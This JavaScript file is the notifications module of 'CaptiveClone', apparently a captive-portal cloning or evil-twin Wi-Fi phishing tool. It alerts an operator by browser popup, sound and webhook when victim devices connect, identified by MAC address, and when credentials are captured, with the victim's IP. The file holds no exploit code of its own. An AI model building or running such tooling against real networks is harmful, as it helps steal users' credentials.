/**
 * CaptiveClone Notifications Module
 * Provides a notification system using the Web Notifications API
 * and websocket-based real-time updates
 */

// Notification settings
let notificationSettings = {
  enableBrowserNotifications: true,
  enableSoundAlerts: true,
  enableEmailAlerts: false,
  enableWebhooks: false,
  emailAddress: '',
  webhookUrl: '',
  notifyOnNewClients: true,
  notifyOnCredentials: true,
  notifyOnAttackStatus: true
};

// Sound effects
const sounds = {
  credential: new Audio('/static/sounds/credential-captured.mp3'),
  client: new Audio('/static/sounds/client-connected.mp3'),
  alert: new Audio('/static/sounds/alert.mp3')
};

// Socket.io connection
let socket = null;

/**
 * Initialize the notification system
 */
function initNotifications() {
  // Request notification permission if needed
  if (notificationSettings.enableBrowserNotifications) {
    requestNotificationPermission();
  }
  
  // Load user settings from localStorage
  loadNotificationSettings();
  
  // Set up socket connection for real-time events
  setupSocketConnection();
  
  // Add event listeners to settings form if it exists
  const settingsForm = document.getElementById('notificationSettingsForm');
  if (settingsForm) {
    settingsForm.addEventListener('submit', saveNotificationSettings);
    
    // Initialize form fields with current settings
    populateSettingsForm();
  }
}

/**
 * Request permission to show browser notifications
 */
function requestNotificationPermission() {
  if (!('Notification' in window)) {
    console.log('This browser does not support notifications');
    return;
  }
  
  if (Notification.permission !== 'granted' && Notification.permission !== 'denied') {
    Notification.requestPermission().then(permission => {
      if (permission === 'granted') {
        showNotification('Notifications Enabled', 'You will now receive alerts for important events.');
      }
    });
  }
}

/**
 * Show a browser notification
 * @param {string} title - Notification title
 * @param {string} body - Notification body text
 * @param {string} icon - URL to notification icon
 * @param {Function} onClick - Click handler for the notification
 */
function showNotification(title, body, icon = '/static/img/logo.png', onClick = null) {
  if (!notificationSettings.enableBrowserNotifications) return;
  
  if (!('Notification' in window) || Notification.permission !== 'granted') {
    console.log('Browser notifications not available or permission not granted');
    return;
  }
  
  const notification = new Notification(title, {
    body: body,
    icon: icon
  });
  
  if (onClick && typeof onClick === 'function') {
    notification.onclick = onClick;
  }
  
  return notification;
}

/**
 * Play a notification sound
 * @param {string} type - Type of sound ('credential', 'client', or 'alert')
 */
function playSound(type = 'alert') {
  if (!notificationSettings.enableSoundAlerts) return;
  
  if (sounds[type]) {
    sounds[type].play().catch(err => {
      console.warn('Error playing notification sound:', err);
    });
  }
}

/**
 * Add an alert message to the UI
 * @param {string} message - Alert message
 * @param {string} type - Alert type ('success', 'warning', 'danger', 'info')
 * @param {boolean} autoHide - Whether to automatically hide the alert
 */
function showAlert(message, type = 'info', autoHide = true) {
  const alertsContainer = document.getElementById('alertsContainer');
  if (!alertsContainer) return;
  
  const alertElement = document.createElement('div');
  alertElement.className = `alert alert-${type} alert-dismissible fade show`;
  alertElement.innerHTML = `
    ${message}
    <button type="button" class="close" data-dismiss="alert" aria-label="Close">
      <span aria-hidden="true">&times;</span>
    </button>
  `;
  
  alertsContainer.appendChild(alertElement);
  
  if (autoHide) {
    setTimeout(() => {
      alertElement.classList.remove('show');
      setTimeout(() => alertElement.remove(), 500);
    }, 5000);
  }
  
  return alertElement;
}

/**
 * Send notifications via webhook
 * @param {string} title - Notification title
 * @param {string} message - Notification message
 * @param {string} type - Notification type
 */
function sendWebhookNotification(title, message, type) {
  if (!notificationSettings.enableWebhooks || !notificationSettings.webhookUrl) return;
  
  const webhookData = {
    title: title,
    message: message,
    type: type,
    timestamp: new Date().toISOString(),
    source: 'CaptiveClone'
  };
  
  fetch(notificationSettings.webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(webhookData)
  })
  .catch(error => {
    console.error('Error sending webhook notification:', error);
  });
}

/**
 * Set up Socket.IO connection for real-time event handling
 */
function setupSocketConnection() {
  // Check if Socket.IO is loaded
  if (typeof io === 'undefined') {
    console.error('Socket.IO is not loaded');
    return;
  }
  
  socket = io();
  
  socket.on('connect', () => {
    console.log('Connected to notification service');
  });
  
  socket.on('disconnect', () => {
    console.log('Disconnected from notification service');
  });
  
  // Listen for credential capture events
  socket.on('credential_captured', data => {
    if (!notificationSettings.notifyOnCredentials) return;
    
    const title = 'Credential Captured';
    const message = `Captured credential from ${data.ip_address || 'unknown IP'}`;
    
    showNotification(title, message);
    playSound('credential');
    showAlert(`<strong>${title}:</strong> ${message}`, 'success');
    sendWebhookNotification(title, message, 'credential');
  });
  
  // Listen for new client events
  socket.on('client_connected', data => {
    if (!notificationSettings.notifyOnNewClients) return;
    
    const title = 'New Client Connected';
    const message = `Client ${data.mac_address || 'unknown'} connected to network`;
    
    showNotification(title, message);
    playSound('client');
    showAlert(`<strong>${title}:</strong> ${message}`, 'info');
    sendWebhookNotification(title, message, 'client');
  });
  
  // Listen for attack status changes
  socket.on('attack_status', data => {
    if (!notificationSettings.notifyOnAttackStatus) return;
    
    const title = 'Attack Status Updated';
    const message = `Status: ${data.status}, Details: ${data.details || 'No details'}`;
    
    showNotification(title, message);
    showAlert(`<strong>${title}:</strong> ${message}`, 'warning');
    sendWebhookNotification(title, message, 'status');
  });
}

/**
 * Save notification settings from the form
 * @param {Event} event - Form submit event
 */
function saveNotificationSettings(event) {
  event.preventDefault();
  
  const form = event.target;
  
  notificationSettings = {
    enableBrowserNotifications: form.enableBrowserNotifications.checked,
    enableSoundAlerts: form.enableSoundAlerts.checked,
    enableEmailAlerts: form.enableEmailAlerts.checked,
    enableWebhooks: form.enableWebhooks.checked,
    emailAddress: form.emailAddress.value.trim(),
    webhookUrl: form.webhookUrl.value.trim(),
    notifyOnNewClients: form.notifyOnNewClients.checked,
    notifyOnCredentials: form.notifyOnCredentials.checked,
    notifyOnAttackStatus: form.notifyOnAttackStatus.checked
  };
  
  // Save to localStorage
  localStorage.setItem('notificationSettings', JSON.stringify(notificationSettings));
  
  // Send settings to server
  fetch('/api/notification-settings', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(notificationSettings)
  })
  .then(response => response.json())
  .then(data => {
    if (data.success) {
      showAlert('Notification settings saved successfully', 'success');
    } else {
      showAlert('Error saving notification settings: ' + data.error, 'danger');
    }
  })
  .catch(error => {
    showAlert('Error saving notification settings: ' + error, 'danger');
  });
}

/**
 * Load notification settings from localStorage
 */
function loadNotificationSettings() {
  const savedSettings = localStorage.getItem('notificationSettings');
  if (savedSettings) {
    try {
      const parsedSettings = JSON.parse(savedSettings);
      notificationSettings = { ...notificationSettings, ...parsedSettings };
    } catch (error) {
      console.error('Error parsing notification settings:', error);
    }
  }
}

/**
 * Populate the settings form with current values
 */
function populateSettingsForm() {
  const form = document.getElementById('notificationSettingsForm');
  if (!form) return;
  
  form.enableBrowserNotifications.checked = notificationSettings.enableBrowserNotifications;
  form.enableSoundAlerts.checked = notificationSettings.enableSoundAlerts;
  form.enableEmailAlerts.checked = notificationSettings.enableEmailAlerts;
  form.enableWebhooks.checked = notificationSettings.enableWebhooks;
  form.emailAddress.value = notificationSettings.emailAddress;
  form.webhookUrl.value = notificationSettings.webhookUrl;
  form.notifyOnNewClients.checked = notificationSettings.notifyOnNewClients;
  form.notifyOnCredentials.checked = notificationSettings.notifyOnCredentials;
  form.notifyOnAttackStatus.checked = notificationSettings.notifyOnAttackStatus;
  
  // Toggle visibility of additional fields based on settings
  toggleSettingsVisibility();
  
  // Add event listeners for toggles
  form.enableEmailAlerts.addEventListener('change', toggleSettingsVisibility);
  form.enableWebhooks.addEventListener('change', toggleSettingsVisibility);
}

/**
 * Toggle visibility of conditional settings fields
 */
function toggleSettingsVisibility() {
  const form = document.getElementById('notificationSettingsForm');
  if (!form) return;
  
  const emailField = document.getElementById('emailAddressField');
  const webhookField = document.getElementById('webhookUrlField');
  
  if (emailField) {
    emailField.style.display = form.enableEmailAlerts.checked ? 'block' : 'none';
  }
  
  if (webhookField) {
    webhookField.style.display = form.enableWebhooks.checked ? 'block' : 'none';
  }
}

/**
 * Test notification settings
 * @param {string} type - Type of notification to test
 */
function testNotification(type) {
  switch (type) {
    case 'browser':
      showNotification('Test Notification', 'This is a test browser notification.');
      break;
    case 'sound':
      playSound('alert');
      break;
    case 'webhook':
      sendWebhookNotification('Test Webhook', 'This is a test webhook notification.', 'test');
      showAlert('Webhook test notification sent.', 'info');
      break;
    default:
      showAlert('Unknown notification test type.', 'warning');
  }
}

// Initialize the notification system when DOM is loaded
document.addEventListener('DOMContentLoaded', initNotifications); 